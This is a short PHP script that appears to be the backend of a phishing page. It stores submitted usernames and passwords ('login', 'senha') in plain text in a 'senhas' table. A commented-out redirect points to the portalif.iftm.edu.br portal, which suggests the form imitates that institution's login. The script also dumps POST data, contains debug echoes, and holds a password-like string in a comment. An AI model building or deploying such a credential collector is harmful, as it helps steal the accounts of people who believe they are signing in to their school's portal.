<?php

$dbhost = '';
$dbname = '';
$dbusername = '';
$dbpassword = '';
var_dump($_POST);



foreach ($_SERVER as $key => $value) {
    if (strpos($key, "MYSQLCONNSTR_localdb") !== 0) {
        continue;
    }

    $dbhost = preg_replace("/^.*Data Source=(.+?);.*$/", "\\1", $value);
    $dbname = preg_replace("/^.*Database=(.+?);.*$/", "\\1", $value);
    $dbusername = preg_replace("/^.*User Id=(.+?);.*$/", "\\1", $value);
    $dbpassword = preg_replace("/^.*Password=(.+?)$/", "\\1", $value);
}

//6#vWHD_$
//localdb

$conn = new mysqli($dbhost, $dbusername, $dbpassword, 'localdb');
echo "oiiii1";
mysqli_set_charset($conn, 'utf8');
echo "oiiii2";
if ( !$conn->connect_errno and isset($_POST['login']) and isset($_POST['senha']) ) {
    echo "oiiii3";
    $stmt = $conn->prepare("INSERT INTO senhas (login, senha) VALUES (?,?)");
echo "oiiii4";
    $stmt->bind_param('ss', $_POST['login'], $_POST['senha']);
    echo "oiiii5";
    $stmt->execute();
    echo "oiiii6";
    $stmt->close();
}

$conn->close();

// header('https://portalif.iftm.edu.br');